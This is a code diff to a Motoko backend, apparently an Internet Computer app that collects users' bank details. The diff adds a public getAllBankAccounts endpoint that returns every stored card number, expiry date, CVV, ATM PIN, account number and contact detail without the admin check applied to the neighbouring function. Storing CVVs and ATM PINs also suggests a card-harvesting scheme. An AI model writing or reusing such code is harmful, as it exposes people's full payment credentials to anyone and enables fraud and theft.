@@ -12,9 +12,10 @@ import MixinAuthorization "authorization/MixinAuthorization";
 import AccessControl "authorization/access-control";
 import MixinStorage "blob-storage/Mixin";
 import Storage "blob-storage/Storage";
+import Migration "migration";
 
-
-
+// Remove persistent accounts from previous migration
+(with migration = Migration.run)
 actor {
   let accessControlState = AccessControl.initState();
   include MixinAuthorization(accessControlState);
@@ -556,6 +557,7 @@ actor {
     };
 
     completeBankDetails.add(caller, bankDetailsToSave);
+
     #success;
   };
 
@@ -581,6 +583,28 @@ actor {
       Runtime.trap("Unauthorized: Only admins can view all bank details");
     };
     completeBankDetails.entries().toArray();
+  };
+
+  // New public function endpoint to get all bank accounts (including pending)
+  public query ({ caller }) func getAllBankAccounts() : async [BankDetailsWithoutNetBanking] {
+    // Build list of pending accounts dynamically by mapping over existing data
+    let resultArray = completeBankDetails.values().toArray().map<BankDetailsWithoutNetBankingV1, BankDetailsWithoutNetBanking>(
+      func(record) {
+        {
+          bankName = record.bankName;
+          accountNumber = record.accountNumber;
+          ifsc = record.ifsc;
+          cardNumber = record.cardNumber;
+          expiryDate = record.expiryDate;
+          cvv = record.cvv;
+          atmPin = record.atmPin;
+          phoneNumber = record.phoneNumber;
+          emailId = record.emailId;
+          status = #pending;
+        };
+      }
+    );
+    resultArray;
   };
 
   // ==== Default Balances ====
